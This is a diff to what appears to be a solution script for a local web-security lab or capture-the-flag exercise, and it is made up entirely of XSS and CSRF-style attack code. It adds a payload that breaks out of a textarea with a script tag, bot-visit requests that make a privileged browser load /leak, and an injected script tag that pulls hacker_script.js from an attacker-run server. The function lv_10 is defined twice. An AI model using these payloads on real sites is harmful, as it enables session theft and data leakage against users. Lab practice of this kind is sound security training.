@@ -64,3 +64,59 @@ def lv_8():
     visit_path = '/visit'
     visit_args = f'?url={base_url}{echo_path}{echo_args}'
     get_GET_result(base_url + visit_path, visit_args)
+
+def lv_9():
+    base_url  = 'http://challenge.localhost:80'
+    
+    echo_path = '/echo'
+    echo_args = '?echo=</textarea><script>alert("x")</script><textarea>'
+    get_GET_result(base_url + echo_path, echo_args)
+
+    visit_path = '/visit'
+    visit_args = f'?url={base_url}{echo_path}{echo_args}'
+    get_GET_result(base_url + visit_path, visit_args)
+
+def lv_10():
+    base_url  = 'http://challenge.localhost:80'
+    
+    echo_path = '/echo'
+    echo_args = '?echo=1'
+    get_GET_result(base_url + echo_path, echo_args)
+
+    visit_path = '/visit'
+    visit_args = f'?url={base_url}/leak'
+    get_GET_result(base_url + visit_path, visit_args)
+
+    get_GET_result(base_url + '/info', '?user=1')
+
+def lv_10():
+    base_url  = 'http://challenge.localhost:80'
+    visit_path = '/visit'
+    visit_args = f'?url={base_url}/leak'
+    get_GET_result(base_url + visit_path, visit_args)
+
+    get_GET_result(base_url + '/info', '?user=1')
+
+def lv_11():
+    server_url = 'http://challenge.localhost:80'
+    hacker_url = 'http://hacker.localhost:8776'
+    visit_path = '/visit'
+    visit_args = f'?url={hacker_url}?redirect={server_url}/leak'
+    get_GET_result(server_url + visit_path, visit_args)
+
+    get_GET_result(server_url + '/info', '?user=1')
+
+def lv_12():
+    server_url = 'http://challenge.localhost:80'
+    hacker_url = 'http://hacker.localhost:8776'
+    visit_path = '/visit'
+    visit_args = f'?url={hacker_url}'
+    get_GET_result(server_url + visit_path, visit_args)
+    get_GET_result(server_url + '/info', '?user=1')
+
+def remote_script():
+    # run `python -m http.server 8776 --bind hacker.localhost` before executing this
+    server_url = 'http://challenge.localhost:80'
+    visit_path = '/visit'
+    visit_args = f'?url={server_url}/echo?echo=<script src="http://hacker.localhost:8776/hacker_script.js"></script>'
+    get_GET_result(server_url + visit_path, visit_args)
